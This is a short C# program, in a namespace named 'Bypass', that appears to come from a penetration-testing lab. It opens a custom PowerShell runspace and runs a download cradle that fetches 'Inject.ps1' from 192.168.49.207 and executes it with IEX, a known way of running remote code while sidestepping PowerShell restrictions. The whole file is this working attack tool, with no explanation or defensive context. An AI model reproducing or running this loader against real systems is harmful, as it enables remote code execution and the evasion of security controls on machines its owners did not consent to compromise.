using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.207/Inject.ps1') | IEX";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}